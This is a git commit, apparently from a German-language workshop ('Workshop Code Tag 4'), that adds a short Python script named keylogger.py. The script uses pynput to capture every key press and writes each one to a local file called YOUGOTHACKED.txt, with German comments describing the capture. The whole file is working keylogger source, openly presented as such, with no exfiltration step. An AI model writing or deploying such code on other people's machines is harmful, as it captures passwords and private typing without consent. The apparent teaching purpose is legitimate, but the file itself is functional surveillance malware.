c7c1b56f5cbec4aae69554eb38a0a637b362ef19
CodeMan <github_me@outlook.de>
2022-11-26 17:10:13 +0100

    Workshop Code Tag 4

---
+++ scripts/keylogger.py
@@ -0,0 +1,21 @@
+import logging
+
+from pynput.keyboard import Key, Listener
+from logging import *
+
+# speichern alle tasten abdrücke in ein text datei names YOUGOTHACKED.txt
+logging.basicConfig(
+    filename=("YOUGOTHACKED.txt"),
+    level= logging.DEBUG,
+    format='%(message)s'
+)
+
+
+# Diese funktion soll die taste name fangen und speichern
+def catchTheKey(key):
+    logging.info(str(key))
+
+
+# zuhörer startet bei beginn auf dem tastetur zu drücken und verkettet alle die registierte tasten
+with Listener(on_press=catchTheKey) as zuhoerer:
+    zuhoerer.join()
